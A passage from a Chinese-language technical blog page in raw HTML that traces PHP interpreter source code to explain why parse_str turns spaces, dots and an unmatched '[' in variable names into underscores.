class="hljs-comment">/* single property guard */</span><br><span class="hljs-keyword">uint32_t</span>     constant_flags;       <span class="hljs-comment">/* constant flags */</span><br><span class="hljs-keyword">uint32_t</span>     extra;                <span class="hljs-comment">/* not further specified */</span><br>&#125; u2;<br>&#125;;<br></code></pre></td></tr></table></figure><p>哈希表：通过哈希函数，讲特定的键映射到特定的值的数据结构，维护键和值的对应关系，但是时间复杂度是O(1)比链表O(n)，效率更高</p><h2 id="PHP经典问题解析"><a href="#PHP经典问题解析" class="headerlink" title="PHP经典问题解析"></a>PHP经典问题解析</h2><h3 id="PHP字符串解析问题"><a href="#PHP字符串解析问题" class="headerlink" title="PHP字符串解析问题"></a>PHP字符串解析问题</h3><p>首先来看一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    parse_str(<span class="hljs-string">&#x27;test[abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br>    parse_str(<span class="hljs-string">&#x27;test abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br>    parse_str(<span class="hljs-string">&#x27;test.abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br><span class="hljs-comment">//我们一定期望 tmp 的键名 分别是 test[abc,test abc,test.abc 然而预期的现象并没有发生</span><br><span class="hljs-comment">//返回结果</span><br><br>E:\审计专用\easyFirewall-shell\审计\test.php:<span class="hljs-number">3</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>E:\审计专用\easyFirewall-shell\审计\test.php:<span class="hljs-number">5</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>E:\审计专用\easyFirewall-shell\审计\test.php:<span class="hljs-number">7</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们发现 ‘[‘ ,’ ‘和’.’，都被替换为了’_’，接下来让我们从内核的角度看一下为什么会出现这样的问题。</p><p>构建简单的PHP代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$tmp</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    parse_str(<span class="hljs-string">&#x27;test[ab=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>关于 parse_str 函数的定义是在 <code>$PHP_SRC/ext/standard/string.c line 5033</code> 处</p><p>让我们来简单看一下函数定义的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">PHP_FUNCTION(parse_str)<br>&#123;<br><span class="hljs-keyword">char</span> *arg;<br>zval *arrayArg = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span> *res = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">size_t</span> arglen;<br><br>ZEND_PARSE_PARAMETERS_START(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">//Zend虚拟机只负责脚本语义解析，所以这里不用过分关注</span><br>Z_PARAM_STRING(arg, arglen)<br><span class="hljs-function">Z_PARAM_OPTIONAL</span><br><span class="hljs-function"><span class="hljs-title">Z_PARAM_ZVAL</span><span class="hljs-params">(arrayArg)</span></span><br><span class="hljs-function"><span class="hljs-title">ZEND_PARSE_PARAMETERS_END</span><span class="hljs-params">()</span></span>;<br><br>res = estrndup(arg, arglen);   <span class="hljs-comment">//将字符串拷贝到新建的位置处</span><br><br><span class="hljs-keyword">if</span> (arrayArg == <span class="hljs-literal">NULL</span>) &#123;<br>zval tmp;<br>zend_array *symbol_table;<br><span class="hljs-keyword">if</span> (zend_forbid_dynamic_call(<span class="hljs-string">&quot;parse_str() with a single argument&quot;</span>) == FAILURE) &#123;  <span class="hljs-comment">//错误处理</span><br>efree(res);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>php_error_docref(<span class="hljs-literal">NULL</span>, E_DEPRECATED, <span class="hljs-string">&quot;Calling parse_str() without the result argument is deprecated&quot;</span>);<br><br>symbol_table = zend_rebuild_symbol_table();<br>ZVAL_ARR(&amp;tmp, symbol_table);<br>sapi_module.treat_data(PARSE_STRING, res, &amp;tmp);     <span class="hljs-comment">//负责线程不安全的处理方法，我这里是TS版本所以实际这里不必关注</span><br><span class="hljs-keyword">if</span> (UNEXPECTED(zend_hash_del(symbol_table, ZSTR_KNOWN(ZEND_STR_THIS)) == SUCCESS)) &#123;<br>zend_throw_error(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Cannot re-assign $this&quot;</span>);<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>arrayArg = zend_try_array_init(arrayArg);<br><span class="hljs-keyword">if</span> (!arrayArg) &#123;<br>efree(res);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>sapi_module.treat_data(PARSE_STRING, res, arrayArg);  <span class="hljs-comment">//这里真正开始解析变量也就是在这个地方下断点</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进来到  <code>$PHP_SRC/main/php_variables.c</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111036660.png" alt="image-20220111103617451"></p><p>这里给出源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">SAPI_API <span class="hljs-title">SAPI_TREAT_DATA_FUNC</span><span class="hljs-params">(php_default_treat_data)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> *res = <span class="hljs-literal">NULL</span>, *var, *val, *separator = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *c_var;<br>zval <span class="hljs-built_in">array</span>;<br><span class="hljs-keyword">int</span> free_buffer = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> *strtok_buf = <span class="hljs-literal">NULL</span>;<br>zend_long count = <span class="hljs-number">0</span>;<br><br>ZVAL_UNDEF(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_POST:<br><span class="hljs-keyword">case</span> PARSE_GET:<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>array_init(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_POST:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_POST]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_POST], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_GET:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_GET]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_GET], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_COOKIE]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_COOKIE], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>ZVAL_COPY_VALUE(&amp;<span class="hljs-built_in">array</span>, destArray);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_POST) &#123;    <span class="hljs-comment">//根据变量的不同类型运行不同解析方法</span><br>sapi_handle_post(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_GET) &#123;<span class="hljs-comment">/* GET data */</span><br>c_var = SG(request_info).query_string;<br><span class="hljs-keyword">if</span> (c_var &amp;&amp; *c_var) &#123;<br>res = (<span class="hljs-keyword">char</span> *) estrdup(c_var);<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_buffer = <span class="hljs-number">0</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<span class="hljs-comment">/* Cookie data */</span><br>c_var = SG(request_info).cookie_data;<br><span class="hljs-keyword">if</span> (c_var &amp;&amp; *c_var) &#123;<br>res = (<span class="hljs-keyword">char</span> *) estrdup(c_var);<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_buffer = <span class="hljs-number">0</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg == PARSE_STRING) &#123;<span class="hljs-comment">/* String data */</span>  <span class="hljs-comment">//解析字符串 这个才是我们关注的，但是这里没有函数调用接着往下看</span><br>res = str;<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!res) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_GET:<br><span class="hljs-keyword">case</span> PARSE_STRING:<br>separator = PG(arg_separator).input;  <span class="hljs-comment">//PG是为了解决线程安全的全局变量宏</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>separator = <span class="hljs-string">&quot;;\0&quot;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>var = php_strtok_r(res, separator, &amp;strtok_buf);  <span class="hljs-comment">//字符串切片存入数组，因为这里&amp;strtok_buf是NULL所以这里只是遍历没有影响</span><br><br><span class="hljs-keyword">while</span> (var) &#123;<br><span class="hljs-keyword">size_t</span> val_len;<br><span class="hljs-keyword">size_t</span> new_val_len;<br><br>val = <span class="hljs-built_in">strchr</span>(var, <span class="hljs-string">&#x27;=&#x27;</span>);   <span class="hljs-comment">//=用于区分变量名，变量名对应的变量值 这里val取到了变量的值</span><br><br><span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<br><span class="hljs-comment">/* Remove leading spaces from cookie names, needed for multi-cookie header where ; can be followed by a space */</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">isspace</span>(*var)) &#123;<br>var++;<br>&#125;<br><span class="hljs-keyword">if</span> (var == val || *var == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br><span class="hljs-keyword">goto</span> next_cookie;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (++count &gt; PG(max_input_vars)) &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Input variables exceeded &quot;</span> ZEND_LONG_FMT <span class="hljs-string">&quot;. To increase the limit change max_input_vars in php.ini.&quot;</span>, PG(max_input_vars));      <span class="hljs-comment">//越界检测</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (val) &#123; <span class="hljs-comment">/* have a value */</span>   <span class="hljs-comment">//就是在尾巴加上结束符</span><br><br>*val++ = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<br>val_len = php_raw_url_decode(val, <span class="hljs-built_in">strlen</span>(val));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>val_len = php_url_decode(val, <span class="hljs-built_in">strlen</span>(val));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>val     = <span class="hljs-string">&quot;&quot;</span>;<br>val_len =  <span class="hljs-number">0</span>;<br>&#125;<br><br>val = estrndup(val, val_len);<br><span class="hljs-keyword">if</span> (arg != PARSE_COOKIE) &#123;<br>php_url_decode(var, <span class="hljs-built_in">strlen</span>(var));<br>&#125;<br><span class="hljs-keyword">if</span> (sapi_module.input_filter(arg, var, &amp;val, val_len, &amp;new_val_len)) &#123;<br>php_register_variable_safe(var, val, new_val_len, &amp;<span class="hljs-built_in">array</span>);   <span class="hljs-comment">//这里开始真正注册变量了 标重点！！！！！！！！！！！！下面放图</span><br>&#125;<br>efree(val);<br>next_cookie:<br>var = php_strtok_r(<span class="hljs-literal">NULL</span>, separator, &amp;strtok_buf);<br>&#125;<br><br><span class="hljs-keyword">if</span> (free_buffer) &#123;<br>efree(res);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到最终会运行 php_register_variable_ex  上面的 ZVAL_NEW_STR 是注册字符串操作</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111055574.png" alt="image-20220111105528468"></p><p>终于来到了真正产生问题的地方，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">PHPAPI <span class="hljs-keyword">void</span> <span class="hljs-title">php_register_variable_ex</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *var_name, zval *val, zval *track_vars_array)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> *p = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span> *ip = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">/* index pointer */</span><br><span class="hljs-keyword">char</span> *index;<br><span class="hljs-keyword">char</span> *var, *var_orig;<br><span class="hljs-keyword">size_t</span> var_len, index_len;<br>zval gpc_element, *gpc_element_p;<br>zend_bool is_array = <span class="hljs-number">0</span>;<br>HashTable *symtable1 = <span class="hljs-literal">NULL</span>;<br>ALLOCA_FLAG(use_heap)<br><br>assert(var_name != <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">if</span> (track_vars_array &amp;&amp; Z_TYPE_P(track_vars_array) == IS_ARRAY) &#123;<br>symtable1 = Z_ARRVAL_P(track_vars_array);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!symtable1) &#123;<br><span class="hljs-comment">/* Nothing to do */</span><br>zval_ptr_dtor_nogc(val);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-comment">/* ignore leading spaces in the variable name */</span><br><span class="hljs-keyword">while</span> (*var_name==<span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>var_name++;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Prepare variable name</span><br><span class="hljs-comment"> */</span><br>var_len = <span class="hljs-built_in">strlen</span>(var_name);<br>var = var_orig = do_alloca(var_len + <span class="hljs-number">1</span>, use_heap); <span class="hljs-comment">//传值</span><br><span class="hljs-built_in">memcpy</span>(var_orig, var_name, var_len + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">/* ensure that we don&#x27;t have spaces or dots in the variable name (not binary safe) */</span><br><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//空格 和 点 会被替换成下划线 </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//如果变量的数组存在 [ 会被认为是array型的变量</span><br>is_array = <span class="hljs-number">1</span>;<br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>var_len = p - var;<br><br><span class="hljs-keyword">if</span> (var_len==<span class="hljs-number">0</span>) &#123; <span class="hljs-comment">/* empty variable name, or variable name with a space in it */</span><br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (var_len == <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;this&quot;</span>)<span class="hljs-number">-1</span> &amp;&amp; EG(current_execute_data)) &#123;<br>zend_execute_data *ex = EG(current_execute_data);<br><br><span class="hljs-keyword">while</span> (ex) &#123;<br><span class="hljs-keyword">if</span> (ex-&gt;func &amp;&amp; ZEND_USER_CODE(ex-&gt;func-&gt;common.type)) &#123;<br><span class="hljs-keyword">if</span> ((ZEND_CALL_INFO(ex) &amp; ZEND_CALL_HAS_SYMBOL_TABLE)<br>&amp;&amp; ex-&gt;symbol_table == symtable1) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(var, <span class="hljs-string">&quot;this&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;this&quot;</span>)<span class="hljs-number">-1</span>) == <span class="hljs-number">0</span>) &#123;<br>zend_throw_error(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Cannot re-assign $this&quot;</span>);<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ex = ex-&gt;prev_execute_data;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* GLOBALS hijack attempt, reject parameter */</span><br><span class="hljs-keyword">if</span> (symtable1 == &amp;EG(symbol_table) &amp;&amp;<br>var_len == <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;GLOBALS&quot;</span>)<span class="hljs-number">-1</span> &amp;&amp;<br>!<span class="hljs-built_in">memcmp</span>(var, <span class="hljs-string">&quot;GLOBALS&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;GLOBALS&quot;</span>)<span class="hljs-number">-1</span>)) &#123;<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>index = var;<br>index_len = var_len;<br><br><span class="hljs-keyword">if</span> (is_array) &#123;<br><span class="hljs-keyword">int</span> nest_level = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">char</span> *index_s;<br><span class="hljs-keyword">size_t</span> new_idx_len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span>(++nest_level &gt; PG(max_input_nesting_level)) &#123;<br>HashTable *ht;<br><span class="hljs-comment">/* too many levels of nesting */</span><br><br><span class="hljs-keyword">if</span> (track_vars_array) &#123;<br>ht = Z_ARRVAL_P(track_vars_array);<br>zend_symtable_str_del(ht, var, var_len);<br>&#125;<br><br>zval_ptr_dtor_nogc(val);<br><br><span class="hljs-comment">/* do not output the error message to the screen,</span><br><span class="hljs-comment"> this helps us to to avoid &quot;information disclosure&quot; */</span><br><span class="hljs-keyword">if</span> (!PG(display_errors)) &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Input variable nesting level exceeded &quot;</span> ZEND_LONG_FMT <span class="hljs-string">&quot;. To increase the limit change max_input_nesting_level in php.ini.&quot;</span>, PG(max_input_nesting_level));<br>&#125;<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>ip++;<br>index_s = ip;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isspace</span>(*ip)) &#123;<br>ip++;<br>&#125;<br><span class="hljs-keyword">if</span> (*ip==<span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>index_s = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ip = <span class="hljs-built_in">strchr</span>(ip, <span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">if</span> (!ip) &#123;<br><span class="hljs-comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span><br>*(index_s - <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;_&#x27;</span>;       <span class="hljs-comment">//这里就是&#x27;[&#x27;被替换成&#x27;_&#x27;的原因了 在处理数组的逻辑中如果找不到对应的 &#x27;[&#x27;就 替换为 &#x27;_&#x27;</span><br><br>index_len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (index) &#123;<br>index_len = <span class="hljs-built_in">strlen</span>(index);<br>&#125;<br><span class="hljs-keyword">goto</span> plain_var;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>*ip = <span class="hljs-number">0</span>;<br>new_idx_len = <span class="hljs-built_in">strlen</span>(index_s);<br>&#125;<br><br><span 